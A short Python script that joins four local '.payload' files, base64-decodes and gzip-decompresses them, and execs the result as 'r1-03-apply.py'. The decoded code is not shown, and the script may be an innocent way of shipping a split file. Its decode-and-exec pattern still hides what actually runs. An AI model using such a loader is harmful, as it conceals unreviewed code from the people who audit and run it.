# -*- coding: utf-8 -*-
import base64
import gzip
from pathlib import Path

ROOT = Path(__file__).resolve().parent
PAYLOAD = "".join(
    (ROOT / f"r1-03-apply.payload.{index:02d}").read_text(encoding="ascii").strip()
    for index in range(1, 5)
)
SOURCE = gzip.decompress(base64.b64decode(PAYLOAD))
exec(compile(SOURCE, "r1-03-apply.py", "exec"))
